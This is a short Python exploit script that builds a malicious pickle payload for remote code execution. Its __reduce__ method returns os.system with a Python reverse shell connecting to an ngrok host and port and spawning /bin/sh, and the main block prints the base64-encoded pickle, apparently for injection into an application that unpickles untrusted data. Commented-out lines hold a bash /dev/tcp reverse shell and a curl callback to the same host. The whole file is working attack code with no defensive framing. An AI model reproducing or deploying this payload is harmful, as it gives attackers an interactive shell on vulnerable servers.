import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        #cmd = ('bash -i >& /dev/tcp/6.tcp.ngrok.io/17366 0>&1')
        #cmd = ('curl 6.tcp.ngrok.io:17366') 
        #cmd = ('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.ngrok.io",17366));os.dup2(s.fileno,0); os.dup2(s.fileno,1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);' ''')
        cmd = ('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.ngrok.io",17366));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
        print(cmd)
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
